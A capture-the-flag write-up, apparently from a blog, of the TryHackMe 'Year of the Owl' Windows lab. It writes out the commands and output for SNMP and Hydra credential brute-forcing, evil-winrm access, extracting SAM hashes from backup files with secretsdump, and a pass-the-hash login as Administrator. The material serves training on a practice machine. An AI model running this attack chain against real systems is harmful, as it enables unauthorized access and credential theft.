---
categories: [TryHackMe]
description: The foolish owl sits on his throne...
tags: [ SNMP, hydra, PrivEsc, Windows, secretsdump, Password Bruteforce, UDP ]
media_subpath: /assets/images/
image:
  alt: Windows Hard Level Machine 👹
  width: "1200"
  height: "630"
  path: https://tryhackme-images.s3.amazonaws.com/room-icons/37401a7f48999c57c03e7d947541b099.png

---

| Machine Link       | [https://tryhackme.com/r/room/yearoftheowl](https://tryhackme.com/r/room/yearoftheowl) |
| ------------------ | -------------------------------------------------------------------------------------- |
| Operating System   | Windows                                                                                |
| Difficulty         | Hard                                                                                   |
| Machine Created by | [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)                               |

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_owl]
└─$ nmap -sC -sV -T4 -p- -oN Nmap_Results.txt -Pn 10.10.129.128
Nmap scan report for 10.10.129.128
Host is up (0.32s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-title: Year of the Owl
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, SMBProgNeg, TerminalServerCookie, oracle-tns: 
|_    Host 'ip-10-11-75-200.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-03-18T09:49:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=year-of-the-owl
| Not valid before: 2024-03-17T09:41:24
|_Not valid after:  2024-09-16T09:41:24
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```
{: .nolineno}

## Web Enumeration ⤵️

I checked port 80 and 443 both are the same with no directories or files in it .

![Image](Pasted%20image%2020240319102042.png)
_Webpage_

So I looked for UDP ports that are open and found this SNMP port when no TCP ports are in help : 

![Image](Pasted%20image%2020240319140421.png)
_NMAP UDP SNMP port scan_

I then brute-forced the snmp information as a password or you can say community name that will help me extract information from snmp service .

![Image](Pasted%20image%2020240319101640.png)
_SNMP service community name bruteforce_

Then I ran this snmpwalk Tool command to extract the information related to usernames like this 🔻

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_owl]
└─$ snmpwalk -c openview -v1 10.10.74.117 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"

```
{: .nolineno}

I then brute-forced the other open services with this <span style="color:#61ffe5">Jareth</span> as username and I used this password list to brute-force the services `/usr/share/wordlists/metasploit/unix_passwords.txt` through <mark style="background: #FF5582A6;">Hydra</mark> Tool.

![Image](Pasted%20image%2020240319101147.png)
_Hydra Tool_

Lets check the other privileges with this credentials 🔽

![Image](Pasted%20image%2020240319101005.png)
_netexec Tool_

### WinRM Session ⤵️

```powershell
┌──(kali㉿kali)-[~/Downloads/Tryhackme]
└─$ evil-winrm -i 10.10.74.117 -u Jareth -p <PASSWORD>                
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Jareth\Documents> cd ..
whoami
*Evil-WinRM* PS C:\Users\Jareth> whoami
year-of-the-owl\jareth
*Evil-WinRM* PS C:\Users\Jareth> tree /f /a
Folder PATH listing
Volume serial number is 7C0C-3814
C:.
+---3D Objects
+---Contacts
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
*Evil-WinRM* PS C:\Users\Jareth> type Desktop\user.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG}
*Evil-WinRM* PS C:\Users\Jareth> 
```
{: .nolineno}

Due to Antivirus I was not able to run <span style="color:#f04276">winPEAS.exe</span> file but I uploaded <span style="color:#61ffe5">.ps1</span> file of it from [here](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1) .

![Image](Pasted%20image%2020240319113459.png)
_winpeas.exe not executed due to AV_

and ran it and I got this important information as it was colorless output 🔽

![Image](Pasted%20image%2020240319113405.png)
_SAM.bak file found_

I checked this directory and found these files ⏬

```powershell
*Evil-WinRM* PS C:\Users\Jareth\Documents> cd 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\'
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir


    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak


*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001>
```
{: .nolineno}

After that I copy these 2 files into attackers machine with smb shares like this ⤵️

![Image](Pasted%20image%2020240319114308.png)
_Transfer of files with SMB service_

Now I have sam and system files so lets use <mark style="background: #FFB86CA6;">secretsdump</mark> Tool to extract some information 🔽

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_owl]
└─$ python3 /opt/Tools/secretsdump.py -sam sam.bak -system system.bak LOCAL       
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662f.....a7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17.....55a:::
[*] Cleaning up... 
```
{: .nolineno}

Lets Pass-the-Hash and get a Administrators shell 🔽

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_owl]
└─$ evil-winrm -i 10.10.160.67 -u Administrator -H 6bc99ede9edcfecf9662f.....a7a
  
Evil-WinRM shell v3.5
 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
tree /f*Evil-WinRM* PS C:\Users\Administrator> tree /f /a
Folder PATH listing
Volume serial number is 7C0C-3814
C:.
+---3D Objects
+---Contacts
+---Desktop
|       admin.txt
|
+---Documents
+---Downloads
|       xampp-windows-x64-7.4.10-0-VC15-installer.exe
|
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
*Evil-WinRM* PS C:\Users\Administrator> cat Desktop\admin.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG}
*Evil-WinRM* PS C:\Users\Administrator> 
```
{: .nolineno}

I am Administrator Now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }